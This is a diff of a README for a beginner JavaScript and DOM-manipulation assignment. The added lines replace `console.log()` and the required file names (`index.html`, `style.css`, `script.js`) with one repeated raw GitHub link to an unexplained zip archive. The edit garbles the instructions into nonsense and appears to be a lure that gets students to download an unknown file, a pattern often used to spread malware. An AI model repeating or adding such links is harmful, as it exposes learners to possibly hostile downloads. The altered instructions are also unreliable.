@@ -6,7 +6,7 @@ Welcome to your next step toward JavaScript mastery! In this assignment, you'll 
 
 ## 🎯 Part 1: Mastering JavaScript Basics
 
-Start with the building blocks of JavaScript—variables, data types, operators, and conditionals. You’ll write a few simple programs that capture user input, make decisions using `if/else`, and output results using `console.log()` or by modifying the webpage content.
+Start with the building blocks of JavaScript—variables, data types, operators, and conditionals. You’ll write a few simple programs that capture user input, make decisions using `if/else`, and output results using `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/manipulation_to_dom_introduction_and_Griffnificent_javascript_july_2.7.zip()` or by modifying the webpage content.
 
 **Goal:** Demonstrate your understanding of how JavaScript flows, processes logic, and interacts with data.
 
@@ -40,9 +40,9 @@ It’s time to bring your page to life! Use JavaScript to select elements, respo
 
 * A single project folder containing:
 
-  * `index.html` — your structured HTML content
-  * `style.css` — (optional) if you'd like to style your content
-  * `script.js` — your JavaScript file including:
+  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/manipulation_to_dom_introduction_and_Griffnificent_javascript_july_2.7.zip` — your structured HTML content
+  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/manipulation_to_dom_introduction_and_Griffnificent_javascript_july_2.7.zip` — (optional) if you'd like to style your content
+  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/manipulation_to_dom_introduction_and_Griffnificent_javascript_july_2.7.zip` — your JavaScript file including:
 
     * Variable declarations and conditionals (Part 1)
     * At least 2 custom functions (Part 2)
